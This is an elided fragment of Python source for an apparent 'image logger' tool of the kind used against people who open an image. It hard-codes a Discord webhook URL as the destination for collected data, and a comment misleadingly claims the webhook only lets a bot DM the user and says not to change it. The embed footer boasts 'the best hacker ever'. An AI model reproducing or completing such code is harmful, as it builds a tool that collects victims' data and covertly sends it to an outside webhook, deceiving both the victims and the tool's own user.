...
class imageloggerV2:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/1218531618172702832/VBRMRanTBOQErousrQWTLdknfJgru3qhgHQ0hhQI9-qiUzr11KwAQcw83nwHmXhZp_xw" #THIS EMBEDDED WEBHOOK MAKES A BOT DM YOU THE IMAGE SO YOU CAN SEND IT (DON'T CHANGE IT)
        self.files = ""
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                      "text": "the best hacker ever (ic3peak)"
                    }
                }
            ]
        }
